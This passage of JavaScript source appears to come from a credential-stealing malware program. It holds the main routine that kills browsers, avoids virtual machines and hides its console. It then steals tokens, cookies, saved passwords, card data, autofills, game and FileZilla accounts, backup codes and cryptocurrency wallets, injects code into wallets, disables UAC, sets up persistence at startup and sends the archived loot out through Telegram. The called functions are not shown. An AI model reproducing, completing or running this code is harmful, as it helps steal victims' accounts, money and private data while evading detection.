    else if (path.includes("Edge")) return `Edge${using ? `_${using}` : ""}`;
    else return "Unknown";
}

async function killAllBrowserProcesses() {
    const browsers = ['chrome', 'edge', 'brave', 'opera', 'opera_gx', 'yandex'];
    await Promise.all(browsers.map(browser => killBrowserProcess1295(browser)));
}

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

async function executeTasksInOrder() {
    const tasks = [
        { name: 'main', func: main },
        { name: 'hideconsole', func: hideconsole },
        { name: 'antivm', func: antivm },
        // binder, 
        { name: 'initializeFolders', func: initializeFolders },
        { name: 'closeBrowsers', func: closeBrowsers },
        { name: 'Killchrome', func: Killchrome },
      
        { name: 'getEncrypted', func: getEncrypted },
        { name: 'getTokens', func: getTokens },

        { name: 'submitFileZilla', func: submitFileZilla },
        
        { name: 'SubmitRiotGames', func: SubmitRiotGames },
        { name: 'getGrowtopia', func: getGrowtopia },
        { name: 'submitMinecraft', func: submitMinecraft },
        { name: 'StealEpicGames', func: StealEpicGames },
        { name: 'SubmitSteam', func: SubmitSteam },
        { name: 'stealSteamSession', func: stealSteamSession },

        { name: 'getCookiesfromdecrypt', func: getCookiesfromdecrypt },
        { name: 'getAutofills', func: getAutofills },
        { name: 'getCards', func: getCards },
        { name: 'getPasswords', func: getPasswords },

        { name: 'startProcess1295', func: startProcess1295 },
        { name: 'fetchAllCookies', func: fetchAllCookies },
        { name: 'fetchAllCookies5', func: fetchAllCookies5 },
        { name: 'stealFiles', func: stealFiles },
        { name: 'getFirefoxxPasses', func: getFirefoxxPasses },
        { name: 'getzNewChoromiumCookies', func: getzNewChoromiumCookies },
        { name: 'exodusDecrypt', func: exodusDecrypt },
        { name: 'findBackupCodes', func: findBackupCodes },
        { name: 'findEpicGamesBackupCodes', func: findEpicGamesBackupCodes },
        { name: 'findGithubBackupCodes', func: findGithubBackupCodes },
        { name: 'localWalletData', func: localWalletData },
        { name: 'walletinjection', func: walletinjection },
        { name: 'disableuac', func: disableuac },
        { name: 'computerinfo', func: computerinfo },
        { name: 'startup', func: startup },
        // { name: 'createRunBat', func: createRunBat },
        { name: 'createAndExecuteScripts', func: createAndExecuteScripts },
        { name: 'redirectErrorsToLog', func: redirectErrorsToLog },
        { name: 'SubmitTelegram', func: SubmitTelegram },
        { name: 'archiveAndSendData', func: archiveAndSendData },
    ];
    
    for (const task of tasks) {
        try {
            // console.log(`startin task: ${task.name}`);
            await task.func();
            // console.log(`completed task: ${task.name}`);
        } catch (error) {
            // console.error(`err in ${task.name}:`, error);
            const errorLog = path.join(mainFolderPath, 'error_log.txt');
            fs.appendFileSync(errorLog, `[${new Date().toISOString()}] ${task.name} error: ${error.message}\n`);
            if (task.name.includes('cookies') || task.name.includes('browser')) {
                await killAllBrowserProcesses();
            }
        }
    }
}

executeTasksInOrder();
